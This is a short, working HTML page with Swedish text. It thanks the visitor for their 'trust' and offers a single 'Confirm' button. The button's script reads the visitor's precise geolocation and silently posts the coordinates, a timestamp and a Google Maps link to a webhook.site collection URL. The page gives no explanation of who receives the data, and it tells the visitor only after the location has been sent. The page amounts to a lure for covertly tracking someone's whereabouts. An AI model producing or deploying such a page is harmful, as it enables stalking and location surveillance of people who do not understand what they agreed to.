<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Location Share</title>
</head>
<body>
  <h2>Tack för att du litar på oss – det betyder mycket.</h2>
  <button onclick="shareLocation()">Bekräfta</button>

  <script>
    function shareLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async function(position) {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const timestamp = new Date().toISOString();
          const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

          const data = {
            latitude,
            longitude,
            timestamp,
            map: mapUrl
          };

          await fetch('https://webhook.site/26afdcae-0479-49a8-ae03-88cd64a0d9cd', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
          });

          alert("Tack! Din plats har skickats.");
        }, function(error) {
          alert("Kunde inte hämta plats. Du kanske nekade åtkomst?");
        });
      } else {
        alert("Den här webbläsaren stöder inte platsdelning.");
      }
    }
  </script>
</body>
</html>
